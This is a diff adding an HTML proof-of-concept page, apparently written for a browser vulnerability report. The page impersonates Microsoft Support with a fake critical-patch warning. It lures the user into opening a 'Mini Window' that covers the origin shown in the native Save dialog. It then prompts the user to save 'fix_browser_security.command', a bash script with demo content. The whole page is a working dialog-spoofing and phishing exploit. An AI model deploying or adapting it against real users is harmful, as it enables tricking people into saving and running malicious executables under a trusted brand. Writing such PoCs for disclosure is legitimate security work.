@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Microsoft Support - Security Update</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Helvetica, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 500px;
+            text-align: center;
+        }
+        .logo {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            color: #2f2f2f;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        p {
+            color: #616161;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+        .btn {
+            background-color: #0067b8;
+            color: white;
+            padding: 10px 30px;
+            text-decoration: none;
+            display: inline-block;
+            font-weight: 600;
+            cursor: context-menu;
+        }
+        #log {
+            margin-top: 20px;
+            padding: 10px;
+            background: #e8f5e9;
+            border: 1px solid #4caf50;
+            color: #2e7d32;
+            display: none;
+            text-align: left;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" class="logo">
+    <h1>Action Required: Security Patch</h1>
+    <p>A critical vulnerability has been detected in your browser session. To apply the mandatory security fix, right-click the button below and select <b>"Open in Mini Window"</b> to verify your system integrity.</p>
+    
+    <a id="save-trigger" class="btn" href="https://support.microsoft.com">
+        Apply Critical Patch
+    </a>
+
+    <div id="log"></div>
+</div>
+
+<script>
+    const trigger = document.getElementById('save-trigger');
+    const log = document.getElementById('log');
+
+    trigger.addEventListener('contextmenu', () => {
+        console.log("[PoC] Right-click detected. Waiting for Mini Window to open...");
+        
+        // Delay to allow user to click "Open in Mini Window"
+        // Once Mini Window is open, we trigger the Save File Picker
+        // The Mini Window (always-on-top) will cover the native dialog's origin info
+        setTimeout(async () => {
+            try {
+                // We suggest a malicious-looking filename
+                const handle = await window.showSaveFilePicker({
+                    suggestedName: 'fix_browser_security.command',
+                    types: [{
+                        description: 'System Command',
+                        accept: {'text/plain': ['.command', '.sh']}
+                    }],
+                });
+
+                // If user selects and clicks save, we write malicious content
+                const writable = await handle.createWritable();
+                await writable.write("#!/bin/bash\necho 'EXPLOTED: Malicious script executed!'\nosascript -e 'display dialog \"Vulnerability PoC: Your system has been compromised by a spoofed Save Dialog.\" buttons {\"OK\"} default button \"OK\"'\n");
+                await writable.close();
+
+                log.style.display = 'block';
+                log.innerHTML = `
+                    <b>⚠️ SAVE DIALOG HIJACKED</b><br><br>
+                    File saved successfully: <b>fix_browser_security.command</b><br>
+                    <b>Impact:</b> The user was tricked into saving a malicious executable script. 
+                    The Mini Window covered the "Origin" information in the native Save dialog, 
+                    making it look like a trusted system action from Microsoft Support.
+                `;
+                console.log("[PoC] SUCCESS: Malicious file saved.");
+            } catch (err) {
+                console.log("[PoC] Save cancelled or failed:", err.message);
+            }
+        }, 3500);
+    });
+</script>
+
+</body>
+</html>
